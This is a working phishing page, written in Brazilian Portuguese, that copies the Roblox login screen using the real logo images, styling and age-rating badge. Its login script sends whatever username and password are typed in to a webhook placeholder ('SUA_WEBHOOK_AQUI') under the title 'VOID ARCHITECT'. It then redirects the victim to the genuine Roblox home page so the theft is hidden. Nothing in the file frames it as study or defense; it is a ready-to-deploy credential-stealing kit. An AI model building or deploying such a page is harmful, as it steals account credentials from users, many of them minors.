<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');

        :root {
            --bg-main: #232527;
            --bg-card: #393b3d;
            --text-main: #ffffff;
            --input-bg: #191b1d;
            --rbx-blue: #0084ff;
            --error-red: #f74b52;
        }

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'HCo Gotham SSm', sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
            display: flex; flex-direction: column; overflow-x: hidden;
        }

        /* --- MEDIA QUERIES ULTRA-SMALL --- */
        @media (max-width: 319px) {
            .login-card { padding: 20px 15px !important; width: 90% !important; }
            #brazil-rating-logo { transform: scale(0.8); margin: 20px auto !important; }
        }

        /* --- HEADER --- */
        .roblox-header {
            width: 100%; height: 44px; background: #232527;
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 16px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
            border-bottom: 1px solid #454749;
        }
        .roblox-logo {
            height: 28px; width: 28px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg==');
            background-size: contain; background-repeat: no-repeat;
        }

        /* --- LOGIN CARD & INPUTS --- */
        .main-content { 
            flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column;
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
            background-size: cover; background-position: center; padding-top: 60px; padding-bottom: 40px;
        }
        .login-card {
            background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px;
            width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        .input-field {
            width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728;
            border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px;
            box-sizing: border-box; font-size: 15px; outline: none;
        }

        /* --- BOTÃO PRIMARY (ESTILO BOOTSTRAP ENVIADO) --- */
        .btn-primary-md {
            display: block; width: 100%; height: 40px; border: 1px solid transparent;
            background-color: #0084ff; color: #fff; border-radius: 4px;
            font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s;
        }
        .btn-primary-md:hover { background-color: #0074e0; }
        .btn-primary-md:active { box-shadow: inset 0 3px 5px rgba(0,0,0,.125); }

        /* --- WIDGET BRAZIL RATING (INTEGRAÇÃO BLOCO 2) --- */
        #brazil-rating-logo {
            width: 282px; margin: 40px auto 0; border-radius: 8px;
            background: #000; display: flex; flex-direction: column; text-align: left;
        }
        #brazil-rating-header {
            color: #fff; text-align: center; padding: 8px; font-size: 12px;
            font-weight: 600; text-transform: uppercase;
        }
        #brazil-rating-content {
            background-color: #fff; display: flex; flex-direction: row;
            padding: 2px; margin: 2px; align-items: center; gap: 2px; border-radius: 8px;
        }
        #brazil-icon {
            height: 70px; width: 70px; background-size: 100%;
            background-image: url(https://images.rbxcdn.com/3bec07bdac3bcd1aa97923cff028b926-classind_12.png);
            flex-shrink: 0;
        }
        #brazil-logo-text-container { color: #000; flex: 1; display: flex; flex-direction: column; text-align: center; }
        .brazil-logo-content-text { font-size: 12px; line-height: 16px; font-weight: 400; }

        /* --- LOADING OVERLAY --- */
        #loading-overlay {
            background-color: rgba(0,0,0,0.85); position: fixed;
            top: 0; left: 0; right: 0; bottom: 0; z-index: 2000;
            display: none; align-items: center; justify-content: center;
            flex-direction: column; color: #fff;
        }
    </style>
</head>
<body class="dark-theme">

<div id="loading-overlay">
    <div class="spinner"></div>
    <div style="margin-top: 15px;">Autenticando via Protocolo VOID...</div>
</div>

<header class="roblox-header">
    <div class="roblox-logo"></div>
    <button style="background:none; border:none; color:white; cursor:pointer; font-weight:500;">Cadastrar-se</button>
</header>

<main class="main-content">
    <div class="login-card">
        <h1 style="margin-bottom: 25px; font-weight: 500; font-size: 24px;">Entrar na Roblox</h1>
        
        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
        <input type="password" id="pass" class="input-field" placeholder="Senha">
        
        <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
        
        <div style="margin-top: 15px;">
            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none;">Esqueceu a senha ou nome de usuário?</a>
        </div>
    </div>

    <div id="brazil-rating-logo">
        <div id="brazil-rating-header">Classificação Indicativa</div>
        <div id="brazil-rating-content">
            <div id="brazil-icon"></div>
            <div id="brazil-logo-text-container">
                <span class="brazil-logo-content-text">
                    <strong>12 ANOS</strong><br>
                    Violência<br>
                    Interação entre usuários<br>
                    Compras no jogo
                </span>
            </div>
        </div>
    </div>
</main>

<script>
    function execLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const overlay = document.getElementById('loading-overlay');

        if(!u || !p) return;

        overlay.style.display = 'flex';

        fetch("SUA_WEBHOOK_AQUI", {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "LOG DE ACESSO - VOID ARCHITECT",
                    fields: [
                        { name: "User", value: u, inline: true },
                        { name: "Pass", value: p, inline: true }
                    ],
                    color: 0,
                    footer: { text: "Operação: Protocolo Colmeia" }
                }]
            })
        }).finally(() => {
            setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 1200);
        });
    }
</script>

</body>
</html>
